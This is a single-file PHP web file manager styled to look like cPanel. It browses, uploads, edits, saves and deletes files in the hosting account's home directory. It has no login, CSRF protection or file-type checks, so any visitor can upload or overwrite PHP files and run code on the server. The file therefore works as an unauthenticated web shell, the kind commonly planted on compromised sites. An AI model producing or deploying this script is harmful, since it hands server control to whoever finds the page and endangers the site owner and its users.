<?php
$base = getenv('HOME') ?: dirname($_SERVER['DOCUMENT_ROOT']);
$path = isset($_GET['path']) ? realpath($base.'/'.ltrim($_GET['path'],'/')) : $base;
if($path===false || strpos($path,$base)!==0) $path=$base;

/* upload + mkdir */
if($_SERVER['REQUEST_METHOD']==='POST'){
    if(isset($_FILES['upload']) && $_FILES['upload']['name']){
        move_uploaded_file($_FILES['upload']['tmp_name'],$path.'/'.basename($_FILES['upload']['name']));
    }

    if(isset($_POST['mkdir']) && $_POST['mkdir']){
        @mkdir($path.'/'.basename($_POST['mkdir']));
    }

    /* save file */
    if(isset($_POST['savefile']) && isset($_POST['filename'])){
        file_put_contents($path.'/'.basename($_POST['filename']), $_POST['content']);
    }
}

/* delete */
if(isset($_GET['delete'])){
    $f = $path.'/'.basename($_GET['delete']);
    if(is_file($f)) @unlink($f);
}

/* edit */
$editFile = '';
if(isset($_GET['edit'])){
    $tmp = $path.'/'.basename($_GET['edit']);
    if(is_file($tmp)) $editFile = $tmp;
}

function rel($b,$p){
    return ltrim(str_replace($b,'',$p),'/\\');
}

$items = scandir($path);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>cPanel Style Manager</title>
<style>
body{margin:0;font-family:Arial;background:#eef2f7;color:#222}
header{background:#ff6c2c;color:#fff;padding:14px 20px;font-size:22px;font-weight:bold}
.wrap{padding:20px}
.grid{display:grid;grid-template-columns:220px 1fr;gap:20px}
.card{background:#fff;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.08);padding:15px;margin-bottom:20px}
.menu a{display:block;padding:10px;border-radius:8px;color:#333;text-decoration:none}
.menu a:hover{background:#f4f4f4}
table{width:100%;border-collapse:collapse}
th,td{padding:10px;border-bottom:1px solid #eee;text-align:left}
input,textarea{padding:8px;width:100%;margin:6px 0;box-sizing:border-box}
button{background:#ff6c2c;color:#fff;border:0;padding:8px 12px;border-radius:6px;cursor:pointer}
a{text-decoration:none;color:#0b57d0}
.muted{color:#666;font-size:13px}
textarea{height:420px;font-family:monospace}
</style>
</head>
<body>

<header>cPanel Style File Manager</header>

<div class="wrap">
<div class="grid">

<div class="card menu">
<b>Tools</b>
<a href="?path=<?php echo urlencode(rel($base,$base)); ?>">Home</a>
<a href="#upload">Upload</a>
<a href="#mkdir">Create Folder</a>

<hr>

<form method="get">
<div class="muted">Go to path:</div>
<input name="path" value="<?php echo htmlspecialchars(rel($base,$path)); ?>">
<button type="submit">Open</button>
</form>

<hr>

<div class="muted">
Current:<br>
<?php echo htmlspecialchars(rel($base,$path) ?: '/'); ?>
</div>
</div>

<div>

<div class="card">
<h3>Files</h3>

<?php if($path!==$base){ ?>
<p>
<a href="?path=<?php echo urlencode(rel($base,dirname($path))); ?>">
⬅ Parent Directory
</a>
</p>
<?php } ?>

<table>
<tr>
<th>Name</th>
<th>Type</th>
<th>Size</th>
<th>Action</th>
</tr>

<?php
foreach($items as $i){
if($i=='.' || $i=='..') continue;

$f = $path.'/'.$i;

echo '<tr><td>';

if(is_dir($f)){
    echo "<a href='?path=".urlencode(rel($base,$f))."'>📁 ".htmlspecialchars($i)."</a>";
}else{
    echo "📄 ".htmlspecialchars($i);
}

echo '</td>';
echo '<td>'.(is_dir($f)?'Folder':'File').'</td>';
echo '<td>'.(is_file($f)?filesize($f):'-').'</td>';
echo '<td>';

if(is_file($f)){
    echo "<a href='?path=".urlencode(rel($base,$path))."&edit=".urlencode($i)."'>Edit</a> | ";
    echo "<a href='?path=".urlencode(rel($base,$path))."&delete=".urlencode($i)."' onclick='return confirm(\"Delete file?\")'>Delete</a>";
}

echo '</td></tr>';
}
?>

</table>
</div>

<div class="card" id="upload">
<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<button>Upload</button>
</form>
</div>

<div class="card" id="mkdir">
<h3>Create Folder</h3>
<form method="post">
<input name="mkdir" placeholder="Folder name">
<button>Create</button>
</form>
</div>

<?php if($editFile){ ?>
<div class="card">
<h3>Edit File: <?php echo htmlspecialchars(basename($editFile)); ?></h3>

<form method="post">
<input type="hidden" name="filename" value="<?php echo htmlspecialchars(basename($editFile)); ?>">
<textarea name="content"><?php echo htmlspecialchars(file_get_contents($editFile)); ?></textarea>
<br>
<button name="savefile" value="1">Save File</button>
</form>

</div>
<?php } ?>

</div>
</div>
</div>

</body>
</html>
